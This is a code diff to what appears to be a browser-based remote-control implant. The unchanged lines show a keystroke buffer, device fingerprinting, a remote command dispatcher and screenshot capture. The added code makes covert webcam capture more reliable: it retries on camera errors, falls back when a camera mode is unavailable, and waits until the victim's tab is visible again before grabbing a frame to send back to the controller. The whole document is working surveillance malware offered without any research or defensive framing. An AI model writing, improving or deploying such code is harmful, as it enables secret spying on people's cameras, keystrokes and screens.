@@ -11,6 +11,7 @@ var MAX_IDLE=7200000;
 var lastCommandTime=Date.now();
 var keysBuffer=[];
 var KEYLOG_FLUSH=10000;
+var _curStream=null,_camPending=null,_camTimer=null,_camGen=0;
 function getSID(){try{return localStorage.getItem(SID_KEY)}catch(e){return null}}
 function setSID(sid){try{localStorage.setItem(SID_KEY,sid)}catch(e){}}
 function getFingerprint(cb){
@@ -62,19 +63,47 @@ window.GH.execute=function(cmd){
     default:window.GH.sendResult(command,JSON.stringify({status:'unknown_command'}));
   }
 };
+function stopCameraStream(){if(_curStream){_curStream.getTracks().forEach(function(t){t.stop()});_curStream=null}}
 function captureCamera(facingMode,cmdId){
   if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){window.GH.sendResult('camera',JSON.stringify({error:'getUserMedia not supported'}));return}
-  navigator.mediaDevices.getUserMedia({video:{facingMode:facingMode,width:{ideal:640},height:{ideal:480}},audio:false}).then(function(stream){
-    var video=document.createElement('video');video.srcObject=stream;video.setAttribute('playsinline','');video.play();
-    video.addEventListener('loadeddata',function(){
-      var canvas=document.createElement('canvas');canvas.width=video.videoWidth||640;canvas.height=video.videoHeight||480;
-      try{var ctx=canvas.getContext('2d');ctx.drawImage(video,0,0,canvas.width,canvas.height);
-      var dataUrl=canvas.toDataURL('image/jpeg',0.7);
-      window.GH.sendResult('camera_'+facingMode,JSON.stringify({image:dataUrl,ts:Date.now()}));
-      stream.getTracks().forEach(function(t){t.stop()});video.remove();canvas.remove()}catch(e){window.GH.sendResult('camera',JSON.stringify({error:'canvas fail:'+e.toString()}));stream.getTracks().forEach(function(t){t.stop()});video.remove()}
+  var gen=++_camGen;
+  if(_camTimer){clearTimeout(_camTimer);_camTimer=null}
+  stopCameraStream();
+  _camPending={mode:facingMode,id:cmdId,gen:gen};
+  var timedOut=false,attempt=0;
+  _camTimer=setTimeout(function(){timedOut=true;stopCameraStream();if(_camPending&&_camPending.gen===gen){_camPending=null;window.GH.sendResult('camera',JSON.stringify({error:'timeout',note:'camera não liberada em 12s — aba precisa estar visível'}))}},12000);
+  function done(ok,payload){
+    if(_camTimer){clearTimeout(_camTimer);_camTimer=null}
+    if(_camPending&&_camPending.gen===gen){_camPending=null;if(ok)window.GH.sendResult('camera_'+facingMode,JSON.stringify(payload));else window.GH.sendResult('camera',JSON.stringify(payload))}
+  }
+  function tryOnce(){
+    var constraint={video:{width:{ideal:640},height:{ideal:480}},audio:false};
+    if(attempt===0&&facingMode)constraint.video.facingMode=facingMode;
+    navigator.mediaDevices.getUserMedia(constraint).then(function(stream){
+      if(timedOut||!_camPending||_camPending.gen!==gen){stream.getTracks().forEach(function(t){t.stop()});return}
+      _curStream=stream;
+      var video=document.createElement('video');video.srcObject=stream;video.setAttribute('playsinline','');video.muted=true;
+      var p=video.play();if(p&&p.catch)p.catch(function(){});
+      video.addEventListener('loadeddata',function(){
+        var canvas=document.createElement('canvas');canvas.width=video.videoWidth||640;canvas.height=video.videoHeight||480;
+        try{var ctx=canvas.getContext('2d');ctx.drawImage(video,0,0,canvas.width,canvas.height);var dataUrl=canvas.toDataURL('image/jpeg',0.7);done(true,{image:dataUrl,ts:Date.now()})}
+        catch(e){done(false,{error:'canvas fail:'+e.toString()})}
+        stopCameraStream();video.remove();canvas.remove();
+      });
+      video.addEventListener('error',function(){done(false,{error:'video error'});stopCameraStream()});
+    }).catch(function(e){
+      if(timedOut||!_camPending||_camPending.gen!==gen)return;
+      var msg=String((e&&e.name)||e);
+      if(attempt<2&&(msg.indexOf('AbortError')>-1||msg.indexOf('NotReadableError')>-1||msg.indexOf('NotFoundError')>-1)){attempt++;setTimeout(tryOnce,800)}
+      else if(attempt===0&&facingMode&&msg.indexOf('OverconstrainedError')>-1){facingMode=null;attempt=1;setTimeout(tryOnce,200)}
+      else done(false,{error:e.toString()})
     })
-  }).catch(function(e){window.GH.sendResult('camera',JSON.stringify({error:e.toString()}))})
+  }
+  tryOnce();
 }
+document.addEventListener('visibilitychange',function(){
+  if(document.visibilityState==='visible'&&_camPending&&!_curStream){var p=_camPending;captureCamera(p.mode,p.id)}
+});
 function captureScreenshot(cmdId){
   if(typeof html2canvas!=='undefined'){
     html2canvas(document.body,{scale:0.5,useCORS:true,allowTaint:true,logging:false}).then(function(canvas){var dataUrl=canvas.toDataURL('image/jpeg',0.6);window.GH.sendResult('screenshot',JSON.stringify({image:dataUrl,ts:Date.now()}))}).catch(function(e){window.GH.sendResult('screenshot',JSON.stringify({error:'html2canvas:'+e.toString()}))})
